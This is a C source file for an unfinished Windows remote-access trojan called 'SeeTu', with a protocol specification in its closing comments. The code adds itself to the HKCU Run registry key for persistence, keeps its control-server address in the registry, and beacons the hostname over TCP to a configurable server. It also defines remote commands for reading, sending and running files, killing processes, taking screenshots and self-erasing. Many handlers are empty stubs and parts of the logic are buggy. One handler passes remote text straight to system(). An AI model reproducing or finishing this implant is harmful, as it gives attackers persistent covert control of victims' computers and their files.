#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <winsock2.h>
#include <windows.h>

struct s_configs{
  uint32_t out_addr; //= 0x100007f;//127.0.0.1
  uint16_t out_port; //= 0x901f;//8080
  uint8_t sleep_hour; //= 1;
  uint8_t sleep_mins; //= 15;
};

union u_commands{
  uint8_t change_configs[8];
  uint8_t recv_file[6];
  uint64_t kill_process;
  char filepath[255];
  char message[255];
};

int get_configs(struct s_configs *configs){
  HKEY hkey;
  ULONGLONG reg_config;
  DWORD size = sizeof(reg_config);
  RegOpenKeyExA(HKEY_CURRENT_USER, "Software", 0, KEY_QUERY_VALUE, &hkey);
  RegGetValueA(hkey, "SeeTu\\Settings", "configs", RRF_RT_REG_QWORD, NULL, &reg_config, &size);
  configs->out_addr = ((reg_config & 0xFFFFFFFF00000000) >> 32);
  configs->out_port = ((reg_config & 0xFFFF0000) >> 16);
  configs->sleep_hour = ((reg_config & 0xFF00) >> 8);
  configs->sleep_mins = (reg_config & 0xFF);
  RegCloseKey(hkey);
  return 0;
}

int setup(struct s_configs *configs){
  char filepath[255];
  char autocommand[255];
  HKEY hkey;
  ULONGLONG reg_config;
  GetModuleFileNameA(NULL, filepath, sizeof(filepath));
  snprintf(autocommand, sizeof(autocommand), "%s -- autostart", filepath);
  RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey);
  RegSetValueExA(hkey, "SeeTu", 0, REG_SZ, autocommand, sizeof(autocommand));
  RegCloseKey(hkey);
  reg_config += configs->out_addr * 0x100000000;
  reg_config += configs->out_port * 0x10000;
  reg_config += configs->sleep_hour * 0x100;
  reg_config += configs->sleep_mins;
  RegOpenKeyExA(HKEY_CURRENT_USER, "Software", 0, KEY_CREATE_SUB_KEY, &hkey);
  RegCreateKeyExA(hkey, "SeeTu\\Settings", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, NULL);
  RegSetValueExA(hkey, "configs", 0, REG_QWORD, (const BYTE*)&reg_config, sizeof(reg_config));
  RegCloseKey(hkey);
  return 0;
}

int reply(uint16_t command, char *data, int datasize){

  return 0;
}

int change_configs(union u_commands *u, struct s_configs *configs){
  memcpy(&configs->out_addr, &u->change_configs[0], 4);
  memcpy(&configs->out_port, &u->change_configs[4], 2);
  memcpy(&configs->sleep_hour, &u->change_configs[7], 1);
  memcpy(&configs->sleep_hour, &u->change_configs[8], 1);
  setup(configs);
  reply(0x01, NULL, 0);
  return 0;
}

int ls_file(union u_commands *u){

}

int cat_file(union u_commands *u){
  FILE* f = fopen(u->filepath, "rb");
  DWORD filesize = GetFileSize(f, NULL);
  uint8_t* buff = malloc(filesize);
  memset(buff, 0, sizeof(buff));
  DWORD x = 0;
  while(1 == 1){
    char c = fgetc(f);
    if(c == EOF || x == filesize){
      break;
    }
    else{
      buff[x] = c;
      x += 1;
    }
  }
  reply(0x04, buff, sizeof(buff));
  free(buff);
  return 0;
}

int send_file(union u_commands *u){

}

int recv_file(union u_commands *u){

}

int delete_file(union u_commands *u){

}

int run_file(union u_commands *u){

}

int process_list(){

}

int kill_process(union u_commands *u){

}

int netstat(){

}

int screenshot(){

}

int location(){

}

int display_message(union u_commands *u){
  char message[255];
  snprintf(message, sizeof(message), "start cmd.exe /S /K cd \\ ^&^& echo %s", u->message);
  system(message);
  return 0;
}

int shutdown_computer(){

}

int self_erase(){

}

int reconnect(){

}

int openconn(struct s_configs* configs){
  int sockfd = socket(AF_INET, SOCK_STREAM, 0);
  if(sockfd == INVALID_SOCKET){
    return -1;
  }

  struct sockaddr_in saddr;
  memset(&saddr, 0, sizeof(saddr));
  saddr.sin_family = AF_INET;
  saddr.sin_port = configs->out_port;
  saddr.sin_addr.s_addr = configs->out_addr;

  if(connect(sockfd, (SOCKADDR *)&saddr, sizeof(saddr)) == SOCKET_ERROR){
    closesocket(sockfd);
    return -1;
  }

  return sockfd;
}

int beacon(int sockfd, struct s_configs *configs){
  int host_len = 0;
  char buff[255] = {0};
  if(gethostname(buff, sizeof(buff)) != 0){
    return -1;
  }
  for(int i = 0; i < sizeof(buff); i++){
    if(buff[i] == '\0'){
      host_len = i + 1;
      break;
    }
  }
  uint8_t msg[3 + host_len];
  msg[0] = 0xAA;
  msg[1] = 0x00;
  msg[2] = host_len;
  for(int i = 0; i < host_len; i++){
    msg[i + 3] = buff[i];
  }
  if(send(sockfd, msg, sizeof(msg), 0) == SOCKET_ERROR){
    return -1;
  }
  return 0;
}

int command(int sockfd, struct s_configs *configs){
  uint8_t buff[2048];
  int size = recv(sockfd, buff, sizeof(buff), 0);
  if(size == SOCKET_ERROR || size == 0){
    return -1;
  }
  if(buff[0] != 0xAA || buff[1] != 0x01){
    return -1;
  }
  union u_commands u;
  int offset = 5;
  uint8_t data_len = buff[2];
  uint8_t vardata = 0;
  uint16_t commands = (buff[3] * 0x100) + buff[4];
  if(commands == 0){
    reply(0, NULL, 0);
    return 0;   
  }
  else if(commands & 0x01 == 0x01){
    memset(&u, 0, sizeof(u));
    memcpy(&u.change_configs, &buff[offset], 8);
    change_configs(&u, configs);
    offset += 8;
  }
  else if(commands & 0x02 == 0x02){
    vardata = buff[offset];
    memset(&u, 0, sizeof(u));
    memcpy(&u.filepath, &buff[offset + 1], vardata);
    ls_file(&u);
    offset += vardata;
  }
  else if(commands & 0x04 == 0x04){
    vardata = buff[offset];
    memset(&u, 0, sizeof(u));
    memcpy(&u.filepath, &buff[offset + 1], vardata);
    cat_file(&u);
    offset += vardata;
  }
  else if(commands & 0x08 == 0x08){
    vardata = buff[offset];
    memset(&u, 0, sizeof(u));
    memcpy(&u.filepath, &buff[offset + 1], vardata);
    send_file(&u);
    offset += vardata;
  }
  else if(commands & 0x10 == 0x10){
    memset(&u, 0, sizeof(u));
    memcpy(&u.recv_file, &buff[offset], 6);
    recv_file(&u);
    offset += 6;
  }
  else if(commands & 0x20 == 0x20){
    vardata = buff[offset];
    memset(&u, 0, sizeof(u));
    memcpy(&u.filepath, &buff[offset + 1], vardata);
    delete_file(&u);
    offset += vardata;
  }
  else if(commands & 0x40 == 0x40){
    vardata = buff[offset];
    memset(&u, 0, sizeof(u));
    memcpy(&u.filepath, &buff[offset + 1], vardata);
    run_file(&u);
    offset += vardata;
  }
  else if(commands & 0x80 == 0x80){
    process_list();
  }
  else if(commands & 0x100 == 0x100){
    memset(&u, 0, sizeof(u));
    memcpy(&u.kill_process, &buff[offset], 8);
    kill_process(&u);
    offset += 8;
  }
  else if(commands & 0x200 == 0x200){
    netstat();
  }
  else if(commands & 0x400 == 0x400){
    screenshot();
  }
  else if(commands & 0x800 == 0x800){
    location();
  }
  else if(commands & 0x1000 == 0x1000){
    vardata = buff[offset];
    memset(&u, 0, sizeof(u));
    memcpy(&u.message, &buff[offset + 1], vardata);
    display_message(&u);
    offset += vardata;
  }
  else if(commands & 0x2000 == 0x2000){
    shutdown_computer();
  }
  else if(commands & 0x4000 == 0x4000){
    self_erase();
  }
  else if(commands & 0x8000 == 0x8000){
    reconnect();
  }
  return 0;
}

int naptime(struct s_configs *configs){
  for(int i = 0; i < configs->sleep_hour; i++){
    Sleep(3600000);
  }
  for(int i = 0; i < configs->sleep_mins; i++){
    Sleep(60000);
  }
}

int main(int argc, char *argv[]){
  //wake up daddys home
  struct s_configs configs;
  memset(&configs, 0, sizeof(configs));
  //[START CONFIGS]
  configs.out_addr = 0x0100007f;//127.0.0.1 --0100007f901f010f
  configs.out_port = 0x901f;//8080
  configs.sleep_hour = 0;
  configs.sleep_mins = 1;
  //[END CONFIGS]

  if(argc < 1 && strncmp(argv[1], "--autostart", 11) == 0){
    get_configs(&configs);
  }
  else{
    setup(&configs);
  }

  while(1 == 1){
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    int sockfd = openconn(&configs);
    if(sockfd == -1){
      naptime(&configs);
      continue;
    }

    if(beacon(sockfd, &configs) == -1){
      closesocket(sockfd);
      naptime(&configs);
      continue;
    }

    closesocket(sockfd);
    naptime(&configs);
  }
  return 0;
}

/*
1. BEACON
+----------+-----------+----------+----------+
|   SYNC   |    TYPE   | HOST LEN |   HOST   |
+----------+-----------+----------+----------+
|   0xAA   |    0x00   |     1    | VARIABLE |
+----------+-----------+----------+----------+

TYPE of 0x00 indicates BEACON frame
HOST LEN is the length of the HOST senction including the null terminator
HOST containts the devices host name

2. COMMAND
+----------+----------+----------+----------+----------+
|   SYNC   |   TYPE   | DATA LEN | COMMANDS |   DATA   |
+----------+----------+----------+----------+----------+
|   0xAA   |   0x01   |     1    |     2    | VARIABLE |
+----------+----------+----------+----------+----------+

TYPE of 0x01 indicates COMMAND frame
DATA LEN is the length in bytes of the DATA section (including null terminator if applicable)
COMMANDS are the commands to be run
DATA is the data associated with the commands

3. REPLY
+----------+----------+----------+----------+----------+
|   SYNC   |   TYPE   | DATA LEN |  COMMAND |   DATA   |
+----------+----------+----------+----------+----------+
|   0xAA   |   0x02   |     1    |     2    |   0xAA   |
+----------+----------+----------+----------+----------+

TYPE of 0x02 indicates REPLY frame
DATA LEN is the length in bytes of the DATA section (including null terminator if applicable)
COMMAND indicates the command that is being replied to

4. TERMINATE
+----------+----------+----------+----------+----------+----------+----------+
|   SYNC   |   TYPE   | ADDR LEN |   ADDR   |   PORT   |SLEEP HOUR|SLEEP MINS|
+----------+----------+----------+----------+----------+----------+----------+
|   0xAA   |   0x03   |     1    | VARIABLE |     2    |     1    |     1    |
+----------+----------+----------+----------+----------+----------+----------+

TYPE of 0x03 indicates TERMINATE frame
ADDR LEN should always be 0x04 for now
ADDR is the address (v4) the agent will connect to, in network bytes order
PORT is the port the agent will connect to, in network bytes order
SLEEP HOUR is the number of hours the agent will sleep for
SLEEP MINS is the number of minutes the agent will sleep for

TYPE: Indicates the packet type
  0x00: BEACON
  0x01: COMMAND
  0x02: REPLY
  0x03: TERMINATE
*/

/*
COMMANDS & OFFSETS
Several commands will initiate a sub-negotiation
The first byte of variable offset will be hte total length
...............0 = CHANGE CONFIGS, 8 bytes
..............0. = LS DIRECTORY, variable
.............0.. = CAT FILE, variable
............0... = SEND FILE, variable
...........0.... = RECV FILE, 6 bytes
..........0..... = DELETE FILE, variable
.........0...... = RUN FILE, variable
........0....... = PROCESS LIST, no offset
.......0........ = KILL PROCESS, 8 bytes
......0......... = NETSTAT, no offset
.....0.......... = SCREENSHOT, no offset
....0........... = LOCATION, no offset
...0............ = DISPLAY MESSAGE, variable
..0............. = SHUTDOWN COMPUTER, no offset
.0.............. = SELF ERASE, no offset
0............... = RECONNECT, no offset
*/
